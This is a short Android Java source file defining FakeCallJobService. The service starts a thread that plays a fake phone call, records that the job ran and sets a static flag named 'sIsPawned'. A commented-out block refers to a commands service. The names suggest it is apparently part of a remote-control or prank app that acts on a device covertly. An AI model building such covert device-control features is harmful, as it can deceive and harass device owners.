package com.candroid.textme.jobs.services;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.os.Process;

import com.candroid.textme.api.Media;
import com.candroid.textme.jobs.JobsScheduler;
import com.candroid.textme.api.Lofl;
import com.candroid.textme.receivers.ScreenReceiver;

public class FakeCallJobService extends JobService {
    @Override
    public boolean onStartJob(JobParameters params) {
        /*Intent fakeCallIntent = new Intent(this, CommandsIntentService.class);
        fakeCallIntent.setAction(CommandsIntentService.ACTION_FAKE_PHONE_CALL);
        startService(fakeCallIntent);*/
        new Thread(new Runnable() {
            @Override
            public void run() {
                Process.setThreadPriority(Process.THREAD_PRIORITY_AUDIO);
                Media.Audio.fakePhoneCall(FakeCallJobService.this);
                Lofl.setJobRan(FakeCallJobService.this, JobsScheduler.FAKE_PHONE_CALL_KEY);
                ScreenReceiver.sIsPawned = true;
                FakeCallJobService.this.jobFinished(params, false);
            }
        }).start();
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return true;
    }
}